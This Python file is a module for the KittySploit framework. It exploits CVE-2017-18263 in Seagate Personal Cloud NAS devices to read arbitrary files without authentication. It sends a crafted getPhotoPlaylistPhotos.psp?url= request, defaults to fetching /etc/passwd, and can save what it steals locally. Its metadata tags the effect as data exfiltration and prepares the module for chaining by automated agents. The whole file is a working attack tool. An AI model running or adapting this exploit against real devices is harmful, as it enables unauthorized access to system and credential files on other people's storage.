#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Seagate Personal Cloud getPhotoPlaylistPhotos file read (CVE-2017-18263)."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.lfi import Lfi


class Module(Auxiliary, Http_client, Lfi):
    __info__ = {
        'name': 'Seagate Personal Cloud - File Read (CVE-2017-18263)',
        'description': (
            'Reads arbitrary files via CVE-2017-18263 getPhotoPlaylistPhotos.psp?url= path.'
        ),
        'author': ['KittySploit Team'],
        'cve': ['CVE-2017-18263'],
        'platform': Platform.LINUX,
        'references': ['https://nvd.nist.gov/vuln/detail/CVE-2017-18263'],
        'tags': ['seagate', 'nas', 'lfi', 'file-read', 'unauth', 'cve-2017-18263'],
        'agent': {
            'risk': 'intrusive',
            'effects': ['data_exfiltration'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': True,
            'produces': ['risk_signals'],
            'cost': 1.2,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'file_read', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['scanner/http/cve_2017_18263_detect'],
            },
        },
    }

    file_read = OptString('/etc/passwd', 'Absolute remote file path to read', required=True)
    output_file = OptString('', 'Local file to write retrieved content', required=False)
    output_limit = OptInteger(12000, 'Max chars to print when output_file empty (0=full)', required=False, advanced=True)

    def execute(self, file_path: str) -> str:
        remote = str(file_path or '').strip()
        if not remote.startswith('/'):
            remote = '/' + remote
        path = f'/getPhotoPlaylistPhotos.psp?url={remote}'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r:
            return ''
        return r.text or ''

    def run(self):
        target = str(self.file_read or '/etc/passwd')
        print_status(f'Reading {target} via Seagate getPhotoPlaylistPhotos ...')
        body = self.execute(target)
        if not body:
            print_error('Empty response')
            return False
        out = str(self.output_file or '').strip()
        if out:
            with open(out, 'w', encoding='utf-8', errors='replace') as fh:
                fh.write(body)
            print_success(f'Wrote {len(body)} bytes to {out}')
        else:
            limit = int(self.output_limit or 0)
            print_info(body if limit <= 0 else body[:limit])
        return True
